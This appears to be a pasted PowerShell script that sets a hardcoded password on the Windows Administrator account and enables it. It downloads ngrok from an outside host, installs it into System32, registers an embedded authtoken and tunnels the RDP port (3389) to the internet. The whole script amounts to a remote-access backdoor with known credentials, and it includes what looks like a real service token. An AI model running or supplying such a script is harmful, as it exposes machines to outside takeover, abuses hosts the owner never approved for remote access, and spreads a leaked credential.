Hosted File:
Set-LocalUser -Name"Administrator"-Password(ConvertTo-SecureString -AsPlainText"@rdpbyav321"-Force)
Get-LocalUser -Name"Administrator"|Enable-LocalUser
Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
tar xf ngrok.zip
Copy ngrok.exeC:\Windows\System32
cmd/cecho./ngrok.exe authtoken"2DOHCaSWjVnvyQ75KyJRqt5i1DP_33S5uYL4ibZfVfxmQva1A">a.ps1
cmd/cecho cmd/kstart ngrok.exe tcp 3389 >> a.ps1
cmd/cecho ping -n 999999 10.10.10.10 >> a.ps1
.\a.ps1
